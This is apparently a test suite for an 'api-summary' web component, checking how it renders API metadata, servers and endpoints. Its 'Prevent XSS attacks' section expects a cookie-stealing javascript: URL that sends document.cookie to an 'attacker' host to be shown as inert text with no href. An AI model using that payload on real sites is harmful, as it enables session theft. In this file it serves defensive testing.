import { fixture, assert, nextFrame, html, aTimeout } from '@open-wc/testing';
import { endpointsValue } from '../../src/elements/ApiSummaryElement.js';
import { AmfLoader } from '../AmfLoader.js';
import '../../api-summary.js';

/** @typedef {import('../../').ApiSummaryElement} ApiSummaryElement */
/** @typedef {import('@api-components/amf-helper-mixin').AmfDocument} AmfDocument */
/** @typedef {import('@api-components/amf-helper-mixin').DomainElement} DomainElement */

describe('ApiSummaryElement', () => {
  const loader = new AmfLoader();

  /**
   * @param {AmfDocument} amf
   * @returns {Promise<ApiSummaryElement>}
   */
  async function modelFixture(amf) {
    const element = await fixture(html`<api-summary 
      .queryDebouncerTimeout="${0}" 
      .amf="${amf}"
    ></api-summary>`);
    await aTimeout(0);
    return /** @type ApiSummaryElement */ (element);
  }

  [false, true].forEach((compact) => {
    describe(compact ? 'Compact model' : 'Full model', () => {
      describe('Basic', () => {
        /** @type AmfDocument */
        let model;
        before(async () => {
          model = await loader.getGraph(compact);
        });

        /** @type ApiSummaryElement */
        let element;
        beforeEach(async () => {
          element = await modelFixture(model);
        });

        it('renders api title', () => {
          const node = element.shadowRoot.querySelector('[role="heading"]');
          assert.dom.equal(node, `<div aria-level="2" class="api-title" role="heading" part="api-title">
            <label part="api-title-label">
              API title:
            </label>
            <span>
              API body demo
            </span>
          </div>`);
        });

        it('renders version', () => {
          const node = element.shadowRoot.querySelector('.inline-description.version span');
          assert.dom.equal(node, '<span>v1</span>');
        });

        it('renders protocols', () => {
          const node = element.shadowRoot.querySelector('.protocol-chips');
          assert.dom.equal(
            node,
            `<div class="protocol-chips">
            <span class="chip">
                HTTP
            </span>
            <span class="chip">
              HTTPS
            </span>
          </div>`
          );
        });

        it('renders description', () => {
          const node = element.shadowRoot.querySelector('arc-marked .markdown-body');
          const content = node.innerHTML.trim();
          assert.ok(content, 'has description');
          const strong = node.querySelector('strong');
          assert.dom.equal(
            strong,
            '<strong>markdown</strong>',
            { ignoreAttributes: ['class'] },
          );
          const anchor = node.querySelector('a');
          assert.dom.equal(
            anchor,
            '<a>evil markdown</a>',
            { ignoreAttributes: ['class'] },
          );
        });

        it('renders base uri', () => {
          const node = element.shadowRoot.querySelector('.url-value');
          assert.equal(node.textContent.trim(), `http://{instance}.domain.com`);
        });

        it('renders endpoints template', () => {
          const node = element.shadowRoot.querySelector('.endpoints-title');
          assert.dom.equal(node, `<label class="endpoints-title section">API endpoints</label>`);
        });
      });

      describe('OAS properties', () => {
        /** @type AmfDocument */
        let model;
        before(async () => {
          model = await loader.getGraph(compact, 'loan-microservice');
        });

        /** @type ApiSummaryElement */
        let element;
        beforeEach(async () => {
          element = await modelFixture(model);
        });
        

        it('provider section is rendered', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"]');
          assert.ok(node);
        });

        it('renders provider name', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
          assert.dom.equal(node, `<span class="provider-name">John Becker</span>`);
        });

        it('renders provider email', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
          assert.dom.equal(
            node,
            `<a class="app-link link-padding provider-email" href="mailto:JohnBecker@cognizant.com">
            JohnBecker@cognizant.com
          </a>`
          );
        });

        it('renders provider url', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
          assert.dom.equal(
            node,
            `<a class="app-link provider-url" href="http://domain.com" target="_blank">http://domain.com</a>`
          );
        });

        it('renders license region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
          assert.ok(node);
        });

        it('renders license link', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
          assert.dom.equal(
            node,
            `<a class="app-link" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
            Apache 2.0
          </a>`
          );
        });

        it('Renders ToS region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
          assert.ok(node);
        });
      });

      describe('Prevent XSS attacks', () => {
        /** @type AmfDocument */
        let model;
        before(async () => {
          model = await loader.getGraph(compact, 'prevent-xss');
        });

        /** @type ApiSummaryElement */
        let element;
        beforeEach(async () => {
          element = await modelFixture(model);
        });

        it('provider section is rendered', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"]');
          assert.ok(node);
        });

        it('renders provider name', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
          assert.dom.equal(node, `<span class="provider-name">Wally</span>`);
        });

        it('renders provider email', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
          assert.dom.equal(
            node,
            `<a class="app-link link-padding provider-email" href="mailto:wallythebest@wally.com">
            wallythebest@wally.com
          </a>`
          );
        });

        it('renders provider url without malicious href', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
          assert.dom.equal(
            node,
            `<a class="app-link provider-url" target="_blank">
              javascript:window.location='http://attacker/?cookie='+document.cookie</a>`
          );
        });

        it('renders license region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
          assert.ok(node);
        });

        it('renders license without malicious href', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
          assert.dom.equal(
            node,
            `<a class="app-link" target="_blank">
            I swear if you click below you will have the most amazing experience ever. I promise.
          </a>`
          );
        });

        it('Renders ToS region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
          assert.ok(node);
        });
      });

      describe('Endpoints rendering', () => {
        /** @type AmfDocument */
        let model;
        before(async () => {
          model = await loader.getGraph(compact);
        });

        /** @type ApiSummaryElement */
        let element;
        beforeEach(async () => {
          element = await modelFixture(model);
        });

        it('adds separator', () => {
          const node = element.shadowRoot.querySelector('.separator');
          assert.ok(node);
        });

        it('renders all endpoints', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item');
          assert.lengthOf(nodes, 70);
        });

        it('renders endpoint name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.dom.equal(
            node,
            `<a
              class="endpoint-path"
              data-shape-type="endpoint"
              href="#/people"
              title="Open endpoint documentation"
              >
              People
            </a>`,
            {
              ignoreAttributes: ['data-id']
            }
          );
        });

        it('sets data-id on name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.ok(node.getAttribute('data-id'));
        });

        it('renders endpoint path with name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path-name');
          assert.dom.equal(node, `<p class="endpoint-path-name">/people</p>`, {
            ignoreAttributes: ['data-id']
          });
        });

        it('sets data-id on path', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.ok(node.getAttribute('data-id'));
        });

        it('renders list of operations', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelectorAll('.method-label');
          assert.lengthOf(nodes, 3);
        });

        it('renders operation method', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.method-label');
          assert.dom.equal(
            node,
            `<a
              class="method-label"
              data-method="get"
              data-shape-type="method"
              href="#/people/get"
              title="Open method documentation"
              >get</a>`,
            {
              ignoreAttributes: ['data-id']
            }
          );
        });

        it('dispatches the navigation event from the endpoint node', (done) => {
          const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'endpoint');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });

        it('dispatches the navigation event from the endpoint path', (done) => {
          const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'endpoint');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });

        it('dispatches the navigation event from the operation click', (done) => {
          const node = element.shadowRoot.querySelector(`.method-label[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'method');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });
      });

      describe('Server rendering', () => {
        /** @type AmfDocument */
        let ramlSingleServerAmf;
        /** @type AmfDocument */
        let oasMultipleServersAmf;
        /** @type AmfDocument */
        let oasMultipleServersWithDescriptionAmf;
        /** @type AmfDocument */
        let noServersAmf;
        before(async () => {
          ramlSingleServerAmf = await loader.getGraph(compact);
          oasMultipleServersAmf = await loader.getGraph(compact, 'multi-server');
          oasMultipleServersWithDescriptionAmf = await loader.getGraph(compact, 'APIC-641');
          noServersAmf = await loader.getGraph(compact, 'no-server');
        });

        it('renders URL area with a single server', async () => {
          const element = await modelFixture(ramlSingleServerAmf);
          const node = element.shadowRoot.querySelector('.endpoint-url');
          assert.ok(node);
        });

        it('renders single server URL', async () => {
          const element = await modelFixture(ramlSingleServerAmf);
          const node = element.shadowRoot.querySelector('.url-value');
          assert.equal(node.textContent.trim(), 'http://{instance}.domain.com');
        });

        it('renders multiple servers', async () => {
          const element = await modelFixture(oasMultipleServersAmf);
          const node = element.shadowRoot.querySelector('.servers');
          assert.ok(node);
        });

        it('renders multiple URLs', async () => {
          const element = await modelFixture(oasMultipleServersAmf);
          const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
          assert.lengthOf(nodes, 4, 'has 4 servers');
          assert.equal(nodes[0].textContent.trim(), 'https://{customerId}.saas-app.com:{port}/v2');
          assert.equal(nodes[1].textContent.trim(), 'https://{region}.api.cognitive.microsoft.com');
          assert.equal(nodes[2].textContent.trim(), 'https://api.openweathermap.org/data/2.5');
          assert.equal(nodes[3].textContent.trim(), 'http://beta.api.openweathermap.org/data/2.5');
        });

        it('does not render URL area when no servers', async () => {
          const element = await modelFixture(noServersAmf);
          const urlNode = element.shadowRoot.querySelector('.url-area');
          assert.notOk(urlNode);
          const serversNode = element.shadowRoot.querySelector('.servers');
          assert.notOk(serversNode);
        });

        it('renders multiple URLs with descriptions', async () => {
          const element = await modelFixture(oasMultipleServersWithDescriptionAmf);
          const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
          assert.lengthOf(nodes, 4, 'has 4 servers');
          assert.equal(nodes[0].textContent.trim(), 'https://api.aws-west-prd.capgroup.com/cdp-proxy/profiles');
          assert.equal(nodes[0].querySelector('arc-marked').markdown, 'MuleSoft PROD');
          assert.equal(nodes[1].textContent.trim(), 'https://api.aws-west-snp.capgroup.com/cdp-proxy-e2e/profiles');
          assert.equal(nodes[1].querySelector('arc-marked').markdown, 'MuleSoft UAT (for enterprise consumers)');
          assert.equal(nodes[2].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-ite2/profiles');
          assert.equal(nodes[2].querySelector('arc-marked').markdown, 'MuleSoft QA (for enterprise consumers)');
          assert.equal(nodes[3].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-dev2/profiles');
          assert.notOk(nodes[3].querySelector('arc-marked'));
        });
      });

      describe('AsyncAPI', () => {
        /** @type AmfDocument */
        let model;
        before(async () => {
          model = await loader.getGraph(compact, 'async-api');
        });

        /** @type ApiSummaryElement */
        let element;
        beforeEach(async () => {
          element = await modelFixture(model);
        });

        it('renders server uri for API', () => {
          const node = element.shadowRoot.querySelector('.url-value');
          assert.equal(node.textContent.trim(), 'amqp://broker.mycompany.com');
        });

        it('renders "API channels" message', () => {
          assert.equal(element.shadowRoot.querySelector('.section.endpoints-title').textContent, 'API channels');
        });
      });

      describe('hideToc', () => {
        /** @type AmfDocument */
        let model;
        before(async () => {
          model = await loader.getGraph(compact);
        });

        /** @type ApiSummaryElement */
        let element;
        beforeEach(async () => {
          element = await modelFixture(model);
          element.setAttribute('hideToc', 'true');
          await nextFrame();
        });

        it('does not render endpoints template', () => {
          const node = element.shadowRoot.querySelector('.toc');
          assert.isNull(node);
        });
      });

      describe('Rendering for library', () => {
        /** @type AmfDocument */
        let libraryModel;
        /** @type AmfDocument */
        let apiModel;
        before(async () => {
          libraryModel = await loader.getGraph(compact, 'APIC-711');
          apiModel = await loader.getGraph(compact);
        });

        /** @type ApiSummaryElement */
        let element;
        beforeEach(async () => {
          element = await modelFixture(apiModel);
        });

        it('clears everything when changing to RAML library', async () => {
          element.amf = libraryModel;
          await aTimeout(0);
          assert.isUndefined(element.summary);
          assert.isUndefined(element.servers);
          assert.isUndefined(element[endpointsValue]);
        });
      });
    });
  });

  describe('a11y', () => {
    /** @type AmfDocument */
    let model;
    before(async () => {
      model = await loader.getGraph(true, 'loan-microservice');
    });

    /** @type ApiSummaryElement */
    let element;
    beforeEach(async () => {
      element = await modelFixture(model);
    });

    it('passes accessibility test', async () => {
      await assert.isAccessible(element, {
        ignoredRules: ['color-contrast']
      });
    });
  });
});
